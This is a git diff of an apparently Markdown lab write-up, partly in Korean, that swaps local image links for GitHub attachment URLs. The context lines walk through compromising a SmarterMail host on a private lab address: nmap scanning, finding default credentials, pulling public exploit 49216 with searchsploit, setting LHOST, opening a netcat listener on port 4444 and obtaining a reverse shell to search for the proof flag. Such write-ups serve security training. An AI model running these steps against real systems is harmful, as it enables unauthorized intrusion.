@@ -2,7 +2,7 @@
 
 > nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.192.65
 
-![](image.png)
+![](https://github.com/user-attachments/assets/8379f885-95c8-42db-b41f-640a2a8ed33e)
 ┌──(root㉿docker-desktop)-[/]
 └─# nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.192.65
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 13:52 +0000
@@ -192,11 +192,11 @@ local: 2020.05.12-administrative.log remote: 2020.05.12-administrative.log
 
 > admin/admin found
 
-![](image_2.png)
+![](https://github.com/user-attachments/assets/bfa1a0b7-486c-416a-afa3-5d422544ef02)
 
 > http://192.168.192.65:9998/interface/root#/login
 
-![](image_5.png)
+![](https://github.com/user-attachments/assets/14d03ad6-4c1e-4214-80db-b4fa4f0979b2)
 
 - SmarterMail found
 - search exploit with Smartermail keyword
@@ -205,11 +205,11 @@ apt install exploitdb
 searchsploit -u
 searchsploit smartermail
 
-![](image_6.png)
+![](https://github.com/user-attachments/assets/0dcdc032-3031-4659-9c75-b19c203d9d9e)
 
 Shellcodes: No Results
 
-![](image_1.png)
+![](https://github.com/user-attachments/assets/22587368-ee3d-40d6-8628-13dffc9edae7)
 
 ┌──(root㉿docker-desktop)-[/]
 └─# http http://192.168.192.65:9998/interface/root#/login
@@ -236,7 +236,7 @@ http://192.168.192.65:9998/interface/root [200 OK] ASP_NET[MVC5.2], Country[RESE
 
 apt install nikto
 nikto -h http://192.168.192.65:9998
-![](image_7.png)
+![](https://github.com/user-attachments/assets/26fa0595-b6bf-4b4d-b15c-5686b83eb02b)
 
 > Since the version is hard to find, let's just proceed in the order of most likely candidates
 
@@ -248,7 +248,7 @@ searchsploit smartermail
 /root/49216.py
 
 ipconfig -> 192.168.45.194 (local)
-![](image_9.png)
+![](https://github.com/user-attachments/assets/6ad29a08-a843-40b7-9274-bbdb36d5936d)
 
 vim 49216.py
 
@@ -273,11 +273,11 @@ ConnectionRefusedError: [Errno 111] Connection refused
 nc -vz -w 3 192.168.192.65 17001
 
 
-> ![](image_8.png)
+> ![](https://github.com/user-attachments/assets/9ab5eed7-4efb-47cf-9d1c-f9e637a75210)
 ```
 
 - tun0 vpn연결 확인 -> LHOST
-  - ![](image_10.png)
+  - ![](https://github.com/user-attachments/assets/5b0e7240-4f81-47d8-98d4-d0e1e392a775)
 
 - 리스닝 열기
   nc -lnvp 4444
@@ -286,7 +286,7 @@ nc -vz -w 3 192.168.192.65 17001
   - python3 49216.py
 
 - 리버싱 연결 완료
-  - ![](image_11.png)
+  - ![](https://github.com/user-attachments/assets/9e1ca24b-a210-49ff-aa05-d75b5a9fb0c6)
 
 - 쉘 버전 확인
   - 파워쉘 확인
@@ -419,7 +419,7 @@ Mode LastWriteTime Length Name
 d-r--- 4/24/2020 3:44 AM Desktop
 
 - FLAG found
-  ![](image_13.png)
+  ![](https://github.com/user-attachments/assets/d2431b32-059b-4bde-b6cd-0ac81d2ffd40)
 
 Get-Content : Cannot find path 'C:\Users\Administrator\Desktop\proof.txt' because it does not exist.
 At line:1 char:1
